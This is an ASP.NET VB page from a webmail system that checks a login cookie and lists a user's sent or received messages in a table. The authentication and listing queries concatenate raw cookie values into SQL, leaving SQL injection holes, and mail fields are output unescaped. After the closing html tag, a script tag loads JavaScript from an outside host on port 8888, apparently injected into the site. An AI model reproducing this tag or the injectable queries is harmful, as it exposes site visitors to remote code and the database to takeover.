<%@ Page Language="VB" %>
<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim FunctionClass As New FunctionClass
    Dim dr As Data.OleDb.OleDbDataReader
    Dim table As String
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        Dim username As String
        Dim rndtext As String
        If Request.Cookies("nbmailsystem") Is Nothing Then
            Exit Sub
        End If
        If Request.Cookies("nbmailsystem")("username") Is Nothing Or Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            Response.Redirect("index.aspx")
        End If
        username = Trim(Request.Cookies("nbmailsystem")("username").ToString())
        rndtext = Trim(Request.Cookies("nbmailsystem")("rndtext").ToString())
        cmd.CommandText = "select count(*) as count001 from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("count001") <= 0 Then
            dr.Close()
            Response.Redirect("index.aspx")
        End If
        dr.Close()
    End Sub
    Protected Sub Page_Unload(ByVal sender As Object, ByVal e As System.EventArgs)
        If (conn Is Nothing) = False Then
            dbconn.Close()
            conn = Nothing
            dbconn = Nothing
            cmd = Nothing
        End If
    End Sub
    Public Sub viewbox(id as integer)
	Dim i As Integer
        Dim count As Integer
        'If sqlRequest.Cookies("nbmailsystem")("username").ToString() Then
        cmd.CommandText = "select count(*) as count123 from " + table + " where " + IIf(table = "sendbox", "SUserName", "RUserName") + "='" + Request.Cookies("nbmailsystem")("username").ToString() + "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        count = dr("count123")
        dr.Close()
        cmd.CommandText = "select * from " + table + " where " + IIf(table = "sendbox", "SUserName", "RUserName") + "='" + Request.Cookies("nbmailsystem")("username").ToString() + "' order by time desc"
        dr = cmd.ExecuteReader()
        Response.Write("<table width=auto height=auto border=1><tr valign=top><td>标题</td><td>" + IIf(table = "sendbox", "收件人", "发件人") + "</td><td>日期</td><td>删除</td>" & IIf(table = "receivedbox", "<td>是否已查看</td>", "") & "</tr>")
        For i = 1 To count
            dr.Read()
            If table = "sendbox" Then
                Response.Write("<tr valign=top><td><a href=viewmail.aspx?id=" & CStr(dr("id")) & "&box=" & Int(Request.QueryString("id")) & ">" & dr("MainTable") + "</a></td><td>" & IIf(table = "sendbox", dr("RUserName"), dr("SUserName")) & "</td><td>" + CStr(dr("time")) & "</td><td><button name=b" & CStr(i) & " type=button onclick=del(" & dr("id") & "," & CStr(id) & ")>删除</button></td></tr>")
            Else
                Response.Write("<tr valign=top><td><a href=viewmail.aspx?id=" & CStr(dr("id")) & "&box=" & Int(Request.QueryString("id")) & ">" & dr("MainTable") + "</a></td><td>" & IIf(table = "sendbox", dr("RUserName"), dr("SUserName")) & "</td><td>" + CStr(dr("time")) & "</td><td><button name=b" & CStr(i) & " type=button onclick=del(" & dr("id") & "," & CStr(id) & ")>删除</button></td><td>" & IIf(dr("IsView") = True, "是", "否") & "</td></tr>")
            End If
        Next
        Response.Write("</table>")
        dr.Close()
    End Sub
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<link rel="stylesheet" href="Style.css" type="text/css" />
<link rel="shortcut icon" href="logo.ico" type="image/x-icon" /> 
    <title>
   
    </title>
</head>
<body>
<script type="text/JavaScript">
function del(id,box)
{
if (confirm("确定删除该邮件吗？"))
{ 
window.location.href="del.aspx?id="+id+"&box="+box
} 
} 
</script> 
    <form id="form1" runat="server">
    <div>
        &nbsp;&nbsp;
        <%
            Dim id As Integer
            If Request.QueryString("id") <> Nothing Then
                id = Int(Request.QueryString("id"))
            End If
            Select Case id
                Case box.sendbox
                    table = "sendbox"
                Case box.receivedbox
                    table = "receivedbox"
                Case Else
                    FunctionClass.DisplayErr(weberr.parerr)
            End Select
            viewbox(id)
            %>
        </div>
    </form>
</body>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>